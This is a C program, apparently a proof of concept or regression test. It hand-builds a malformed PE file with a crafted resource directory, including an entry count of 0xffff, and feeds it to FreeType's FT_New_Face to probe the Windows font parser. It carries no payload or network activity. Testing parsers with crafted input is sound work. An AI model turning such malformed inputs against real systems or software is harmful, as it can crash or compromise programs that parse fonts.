#include <ft2build.h>
#include FT_FREETYPE_H
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static void put16(unsigned char *p, unsigned short v)
{
  p[0] = (unsigned char)v;
  p[1] = (unsigned char)(v >> 8);
}

static void put32(unsigned char *p, unsigned int v)
{
  put16(p, (unsigned short)v);
  put16(p + 2, (unsigned short)(v >> 16));
}

int main(void)
{
  unsigned char pe[0x270];
  FT_Library library;
  FT_Face face = NULL;
  FT_Error error;
  char path[] = "/tmp/fnt-poc-XXXXXX";
  int fd;

  memset(pe, 0, sizeof pe);
  put16(pe, 0x5a4d);
  put32(pe + 0x3c, 0x80);
  put32(pe + 0x80, 0x00004550);
  put16(pe + 0x80 + 4, 0x014c);
  put16(pe + 0x80 + 6, 1);
  put16(pe + 0x80 + 20, 0xe0);
  put16(pe + 0x80 + 24, 0x10b);
  put32(pe + 0x80 + 136, 0x1000);
  put32(pe + 0x80 + 140, 0x70);
  memcpy(pe + 0x178, ".rsrc", 5);
  put32(pe + 0x178 + 12, 0x1000);
  put32(pe + 0x178 + 16, 0x70);
  put32(pe + 0x178 + 20, 0x200);
  put16(pe + 0x200 + 14, 1);
  put32(pe + 0x210, 8);
  put32(pe + 0x214, 0x80000020U);
  put16(pe + 0x220 + 14, 1);
  put32(pe + 0x230, 1);
  put32(pe + 0x234, 0x80000040U);
  put16(pe + 0x240 + 12, 2);
  put16(pe + 0x240 + 14, 0xffff);
  put32(pe + 0x250, 0x409);
  put32(pe + 0x254, 0x60);

  fd = mkstemp(path);
  if (fd < 0 || write(fd, pe, sizeof pe) != sizeof pe)
    return 2;
  close(fd);

  error = FT_Init_FreeType(&library);
  if (error)
    return 2;
  error = FT_New_Face(library, path, 1, &face);
  unlink(path);
  if (!error)
    FT_Done_Face(face);
  FT_Done_FreeType(library);
  printf("FT_New_Face returned %d\n", error);
  return 0;
}
